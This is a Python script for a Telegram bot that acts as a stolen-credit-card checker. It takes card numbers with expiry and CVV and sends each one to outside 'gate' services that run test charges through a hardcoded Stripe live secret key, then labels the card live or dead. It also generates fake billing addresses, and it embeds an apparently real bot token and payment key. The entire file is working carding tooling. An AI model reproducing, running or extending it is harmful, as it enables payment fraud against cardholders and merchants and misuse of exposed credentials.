import telebot
import httpx
import re
import random
from telebot import types
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
TOKEN = "8318488317:AAFyfOLjIAY-p8GaJXmPlhXCu82R3_XEqgU" 
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")
executor = ThreadPoolExecutor(max_workers=15) # Optimized for speed

# --- EXPANDED ADDRESS DATA ---
COUNTRIES = {
    "USA": {"flag": "🇺🇸", "city": ["New York", "Miami", "Chicago", "Houston"], "st": "NY", "zip": "10001"},
    "UK": {"flag": "🇬🇧", "city": ["London", "Manchester", "Birmingham", "Leeds"], "st": "ENG", "zip": "SW1A 1AA"},
    "CA": {"flag": "🇨🇦", "city": ["Toronto", "Vancouver", "Montreal", "Ottawa"], "st": "ON", "zip": "K1P 5M7"},
    "IN": {"flag": "🇮🇳", "city": ["Mumbai", "Delhi", "Bangalore", "Chennai"], "st": "MH", "zip": "400001"},
    "DE": {"flag": "🇩🇪", "city": ["Berlin", "Munich", "Hamburg", "Frankfurt"], "st": "BE", "zip": "10115"},
    "BR": {"flag": "🇧🇷", "city": ["São Paulo", "Rio de Janeiro", "Brasília"], "st": "SP", "zip": "01001-000"},
    "AU": {"flag": "🇦🇺", "city": ["Sydney", "Melbourne", "Brisbane", "Perth"], "st": "NSW", "zip": "2000"}
}

def generate_address(code):
    c = COUNTRIES.get(code, COUNTRIES["USA"])
    fn = random.choice(["James", "Mary", "Robert", "Patricia", "John", "Linda", "Raj", "Sven"])
    ln = random.choice(["Smith", "Brown", "Wilson", "Taylor", "Miller", "Kumar", "Müller"])
    street_num = random.randint(10, 999)
    street_name = random.choice(["Main St", "Park Ave", "Oak Rd", "Broadway", "Victoria St"])
    
    return (
        f"{c['flag']} <b>{code} FULL ADDRESS</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b> <code>{fn} {ln}</code>\n"
        f"🏠 <b>Street:</b> <code>{street_num} {street_name}</code>\n"
        f"🏙 <b>City:</b> <code>{random.choice(c['city'])}</code>\n"
        f"📍 <b>State:</b> <code>{c['st']}</code>\n"
        f"📮 <b>Zipcode:</b> <code>{c['zip']}</code>\n"
        f"━━━━━━━━━━━━━━"
    )

# --- KEYBOARDS ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("💳 Check Card", "🏠 Address Gen", "👤 My Profile", "🛠 Help")
    return markup

def address_menu():
    markup = types.InlineKeyboardMarkup(row_width=3)
    btns = [types.InlineKeyboardButton(f"{v['flag']} {k}", callback_data=f"adr|{k}") for k, v in COUNTRIES.items()]
    markup.add(*btns)
    return markup

def gate_menu(cc):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("⚡ SK BASED", callback_data=f"gt|sk|{cc}"),
        types.InlineKeyboardButton("🔥 AUTOSTRIPE", callback_data=f"gt|as|{cc}"),
        types.InlineKeyboardButton("🚀 CHECK BOTH GATES", callback_data=f"gt|both|{cc}")
    )
    return markup

# --- API LOGIC ---
def check_api(gate, cc):
    try:
        url = f"https://skbased.blinkop.online/?sk=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&amount=1&lista={cc}" if gate == "sk" else f"https://autostripe.blinkop.online/check?gateway=autostripe&key=BlackXCard&site=chiwahwah.co.nz&cc={cc}"
        with httpx.Client(timeout=30.0) as client:
            resp = client.get(url).text.strip()
            # Professional status detection
            if any(x in resp.lower() for x in ["success", "approved", "cvv live", "charged"]):
                return f"✅ <b>LIVE:</b> <code>{resp[:80]}</code>"
            return f"❌ <b>DEAD:</b> <code>{resp[:80]}</code>"
    except Exception as e:
        return f"⚠️ <b>ERROR:</b> <code>{str(e)[:50]}</code>"

# --- HANDLERS ---
@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_message(message.chat.id, "<b>💎 Premium Multi-Gate Bot V5.0</b>\nHigh-speed checking & Global tools active.", reply_markup=main_menu())

@bot.message_handler(func=lambda m: m.text == "🏠 Address Gen")
def show_addr(message):
    bot.send_message(message.chat.id, "<b>🌍 Select Country:</b>", reply_markup=address_menu())

@bot.message_handler(func=lambda m: m.text == "💳 Check Card")
def cc_info(message):
    bot.send_message(message.chat.id, "<b>📥 Send card:</b> <code>CC|MM|YY|CVV</code>")

@bot.message_handler(func=lambda m: True)
def handle_msg(message):
    cards = re.findall(r'\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', message.text)
    if cards:
        bot.reply_to(message, f"💳 <b>Input Detected:</b> <code>{cards[0]}</code>", reply_markup=gate_menu(cards[0]))

@bot.callback_query_handler(func=lambda call: True)
def query_handler(call):
    p = call.data.split("|")
    
    if p[0] == "adr":
        bot.edit_message_text(generate_address(p[1]), call.message.chat.id, call.message.message_id, reply_markup=address_menu())
    
    elif p[0] == "gt":
        gate, cc = p[1], p[2]
        bot.edit_message_text(f"⏳ <b>Requesting Gates...</b>\n💳 <code>{cc}</code>", call.message.chat.id, call.message.message_id)
        
        if gate == "both":
            f1, f2 = executor.submit(check_api, "sk", cc), executor.submit(check_api, "as", cc)
            res = f"<b>Gate 1 (SK):</b> {f1.result()}\n<b>Gate 2 (AS):</b> {f2.result()}"
        else:
            res = f"<b>Result:</b> {check_api(gate, cc)}"
            
        bot.edit_message_text(f"<b>🏁 Check Finished</b>\n💳 <code>{cc}</code>\n━━━━━━━━━━━━━━\n{res}\n━━━━━━━━━━━━━━", call.message.chat.id, call.message.message_id)

print("✅ Professional Bot is LIVE!")
bot.infinity_polling()
